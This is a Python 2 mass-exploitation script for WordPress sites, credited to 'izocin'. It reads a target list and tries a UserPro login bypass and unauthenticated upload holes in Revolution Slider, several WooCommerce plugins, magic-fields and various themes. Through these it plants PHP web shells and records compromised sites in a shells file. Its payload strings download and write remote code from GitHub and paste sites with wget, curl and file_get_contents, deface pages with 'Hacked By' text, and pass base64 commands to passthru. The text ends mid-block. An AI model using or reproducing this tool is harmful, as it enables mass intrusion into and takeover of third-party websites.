#!/usr/bin/python

# Coded By izocin 
# Turkey

import requests, re,urllib, urllib2, os, sys, codecs,binascii, json, argparse					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
from random import sample as rand
from Queue import Queue				   		
from platform import system
from urlparse import urlparse
from optparse import OptionParser	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

####################### 
try:
    dork = raw_input("Write Wordpress site list name \n")
    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n



		
                                                                
                                                                
                                                                
  ,--,                                      ,--,                
,--.'|          ,----,   ,---.            ,--.'|         ,---,  
|  |,         .'   .`|  '   ,'\           |  |,      ,-+-. /  | 
`--'_      .'   .'  .' /   /   |   ,---.  `--'_     ,--.'|'   | 
,' ,'|   ,---, '   ./ .   ; ,. :  /     \ ,' ,'|   |   |  ,"' | 
'  | |   ;   | .'  /  '   | |: : /    / ' '  | |   |   | /  | | 
|  | :   `---' /  ;--,'   | .; :.    ' /  |  | :   |   | |  | | 
'  : |__   /  /  / .`||   :    |'   ; :__ '  : |__ |   | |  |/  
|  | '.'|./__;     .'  \   \  / '   | '.'||  | '.'||   | |--'   
;  :    ;;   |  .'      `----'  |   :    :;  :    ;|   |/       
|  ,   / `---'                   \   \  / |  ,   / '---'        
 ---`-'                           `----'   ---`-'               
                                                                
     
 
 
	Coded By: izocin , https://selly.gg/@kingmaster
									
   
    

		\n""".format(fc, sb)
		
		print banner
 
shell = """GIF89a <?php echo 'izocin'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" Joomla="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
shell_2 = """<?php if(isset($_GET["bang"])){echo"<font color=#FFFFFF>[uname]".php_uname()."[/uname]";echo"<br><font color=#FFFFFF>[dir]".getcwd()."[/dir]";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}}}?>
<title>Bigbang Bot v1</title><center><div id=q>Bigbang Bot<br><font color="#009900" size="3"><pre><img border="0" src="http://www.taco.nu/wp-include//forbid.php?metal=style.jpg" width="0" height="0"></pre><style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}"""

filename = "xx.jpg"

zat = "root.php.xxxjpg"

shell_name = str(time.time())[:-3]

path = str(time.time())[:-3]

filenamex = "RxR_"+str(shell_name)+".php.php"

filenamexy = str(shell_name)+".php"

filevid = "izo.PhP.txtx"

kcfile = "priv.php.jd"

jceupshell = "ups/root.php"

jjshell = "ups/root.php3.g"

izshell = 'shell.jpg'

xjceupshell = "ups/root.php"

zino = "ups/root.php"


xccc = "ups/root.PhP.txt"

xcccc = "ups/root.phP"


zabic = "xxt.php"

listpass = 'password.txt'
listuser = 'user.txt'
filte = "tool/ddd.php"

EMail = 'httpplain@gmail.com'

cfile = "priv.php"


fck = "tool/izocin.txt"

payloadz = "foo=<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/izoking/2/master/u.php -O izo.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"


filecl = "izo.php"

Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/root.php','w+'),file_get_contents('https://ghostbin.com/paste/5cqdd/raw')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("http://pastebin.com/raw/Q1aM9w16"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/XxX.html','w+'),' Hacked By Dr.Shap7-Nine ');"""
headersx = {'action':'woof_upload_ext','abspath':'data:,<?php system("curl https://hastebin.com/raw/ehugeyihex -o root.php"); ?>'}

def rand_str (len = None) :
	if len == None :
		len = 8
	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))
	
def prepare(url, ua):
	try:
		global user_agent
		headers = {
			'User-Agent' : user_agent,
			'x-forwarded-for' : ua
		}
		cookies = urllib2.Request(url, headers=headers)
		result = urllib2.urlopen(cookies)
		cookieJar = result.info().getheader('Set-Cookie')
		injection = urllib2.Request(url, headers=headers)
		injection.add_header('Cookie', cookieJar)
		urllib2.urlopen(injection)
	except:
		pass
def toCharCode(string):
	try:
		encoded = ""
		for char in string:
			encoded += "chr({0}).".format(ord(char))
		return encoded[:-1]
	except:
		pass


def wpbot(url):


	
    try:
		
		

		filenames = 'RxR' + '__' + rand_str (5) + '.php'

		# 1 .   Gravity Forms		
			
		
		zzzazirevlib = requests.get(url+"/?up_auto_log=true")
				
		if 'logout' in zzzazirevlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} UserPro Bypass     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('userprobypass.txt', 'a').write(url+'/?up_auto_log=true'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} UserPro Bypass     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			
		
		# 1 .   Gravity Forms
		
		
		appgravkg  = {'folder':'/wp-content/themes/qualifire/scripts/admin/uploadify/'}
		
		
		Gravkg = {'Filedata':(filename, shell_2, 'text/html')}
		
		Gravkgreq = requests.post(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/uploadify.php', data=appgravkg, files=Gravkg)
	
		
		Gravkglib = requests.get(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'?bang')
		
		
		if 'Bigbang' in Gravkglib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} qualifire     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",Gravkglib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/qualifire/scripts/admin/uploadify/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} qualifire     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		# 2 .   revslider 

		
					  		  
		zorr = requests.post(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/action.php', headers=headersx)
		ddGravkglib = requests.get(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/root.php?shell')
		if 'Bigbang' in ddGravkglib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce 0day     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",ddGravkglib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/root.php?shell'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/woocommerce-products-filter/lib/simple-ajax-uploader/root.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce 0day     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		cisabo = {'uploadfile': (filecl, shell_2, 'text/html')}

		mmcizo = requests.post(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/upload.php', data={'value': './'}, files=cisabo)

		token = re.findall('(.*?).php', mmcizo.text)
		
		misonzslib = requests.get(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+token[0]+'.php')
		
		
		if 'Bigbang' in misonzslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce-custom-t-shirt     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
                        xshell_path = re.findall("uname(.*?)/uname",misonzslib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+tokens[0]+'.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/woocommerce-custom-t-shirt-designer/includes/templates/template-black/designit/cs/uploadImage/'+tokens[0]+'.php'+'\n')
			sys.exit()                                    
			sys.exit()

		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce-custom-t-shirt     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 2 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':(filenames, shell_2, 'text/html')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames)
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider News     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'?bang'+'\n')
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
			token = xshell_path[0]
			Check = token.replace("[", "")
			Check1 = Check.replace("]", "")
			open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'?bang'+'\n'+Check1+'\n\n')
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider News     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		#1 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Old     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Revslider Old     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		# 2 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Avada     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/Avada/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Avada     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		# 3 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} striking     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/striking_r/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} striking     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 4 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} IncredibleWP     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/IncredibleWP/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} IncredibleWP     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

			
		# 5 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} ultimatum     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/ultimatum/wonderfoundry/addons/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} ultimatum     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				


			
		# 6 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} medicate     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/medicate/script/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} medicate     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				


			
		# 7 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} centum     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/centum/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} centum     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

			
		# 8 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'izocin' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} beach_apollo     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/beach_apollo/advance/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} beach_apollo     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)				

			
		# 9 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} cuckootap     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/cuckootap/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} cuckootap     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 10 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pindol     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/pindol/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pindol     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
		# 11 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} designplus     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/designplus/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} designplus     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
		# 12 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} rarebird     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/rarebird/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} rarebird     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 13 .   revslider 

		
		revsliderapp = {'action':'revslider_ajax_action',
					    'client_action':'update_plugin'}
					  

					  
		revsliderup = {'update_file':open('tool/izo.zip', 'rb')}
		
		
		revslidereq = requests.post(url+'/wp-admin/admin-ajax.php', data=revsliderapp , files=revsliderup)
		
		revsliderlib = requests.get(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang')
		
		
		
		if 'Bigbang' in revsliderlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} andre     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",revsliderlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/izo.php?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/andre/framework/plugins/revslider/temp/update_extract/revslider/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} andre     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
			
		# 4 . Reflex Gallery
		
		aaReflexup = {'Filedata' : (filenames, shell_2, 'text/html')}
		
		aaReflexreq = requests.post(url+'/wp-content/themes/Coldfusion/includes/uploadify/upload_settings_image.php', files=aaReflexup)
		
		aaReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang')
		
		
		if 'Bigbang' in aaReflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Coldfusion     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",aaReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} Coldfusion     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	

	
		# 4 . Reflex Gallery
		
		aReflexup = {'qqfile' : (filenames, shell_2, 'text/html')}
		
		aReflexreq = requests.post(url+'/wp-content/plugins/magic-fields/RCCWP_upload_ajax.php', files=aReflexup)
		
		aReflexlib = requests.get(url+'/wp-content/files_mf/'+filenames+'?bang')
		
		
		if 'Bigbang' in aReflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} magic-fields     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",aReflexlib.content)
                        token = xshell_path[0]
                        Check = token.replace("[", "")
                        Check1 = Check.replace("]", "")
                        open('Vulns/wordpressshell.txt', 'a').write(url+'/wp-content/files_mf/'+filenames+'?bang'+'\n'+Check1+'\n\n')
                        open('Vulns/Shells.txt', 'a').write(url+'/wp-content/files_mf/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} magic-fields     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)	
		
			
		# 4 . Reflex Gallery
		
		bReflexup = {'Filedata' : (filenames, shell_2, 'text/html')}
		
		bReflexreq = requests.post(url+'/wp-content/themes/Ghost/includes/uploadify/upload_settings_image.php', files=bReflexup)
		
		bReflexlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames+'?bang')
		
		
		if 'Bigbang' in bReflexlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} Ghost     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			xshell_path = re.findall("uname(.*?)/uname",bReflexlib.content)
                        token = xshell_path[0]
